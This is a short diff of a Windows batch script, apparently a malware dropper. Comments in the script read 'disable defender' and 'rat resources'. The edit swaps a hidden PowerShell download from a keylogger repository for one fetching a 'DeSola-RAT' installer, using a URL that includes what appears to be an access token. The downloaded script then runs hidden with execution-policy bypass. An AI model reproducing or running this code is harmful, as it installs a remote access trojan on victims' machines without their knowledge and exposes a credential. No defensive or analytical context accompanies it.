@@ -31,5 +31,5 @@ if '%errorlevel%' NEQ '0' (
 @REM disable defender
 
 @REM rat resources
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/PrettyBoyCosmo/DucKey-Logger/refs/heads/main/p.ps1 -Outfile install.ps1"
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/r00tm4st3r/DeSola-RAT/refs/heads/main/files/installer.ps1?token=GHSAT0AAAAAADTA4ETPKNWQQUSTZNFUGASQ2MDKHWQ -Outfile installer.ps1"
 powershell Start-Process -windowstyle hidden -ep bypass "installer.ps1"
